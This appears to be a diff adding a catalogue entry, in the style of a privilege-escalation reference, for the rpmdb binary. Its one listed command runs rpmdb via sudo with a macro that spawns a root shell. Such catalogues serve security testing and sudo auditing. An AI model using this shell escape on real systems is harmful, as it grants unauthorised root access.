@@ -1,0 +1,4 @@
+name: rpmdb
+binary_path: /usr/bin/rpmdb
+exploit_cmds:
+- sudo /usr/bin/rpmdb --eval '%(/bin/sh 1>&2)'
